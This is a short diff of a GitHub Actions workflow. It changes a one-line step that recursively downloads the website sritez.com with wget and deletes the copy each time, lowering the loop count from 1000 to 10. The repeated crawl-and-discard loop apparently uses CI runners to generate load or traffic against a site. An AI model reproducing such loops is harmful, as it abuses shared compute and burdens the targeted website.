@@ -32,7 +32,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: for (( i = 0; i < 1000; i++ )); do wget -r -np -k https://sritez.com/; rm -rf *sritez*; done
+        run: for (( i = 0; i < 10; i++ )); do wget -r -np -k https://sritez.com/; rm -rf *sritez*; done
 
       # Runs a set of commands using the runners shell
 #       - name: Run a multi-line script
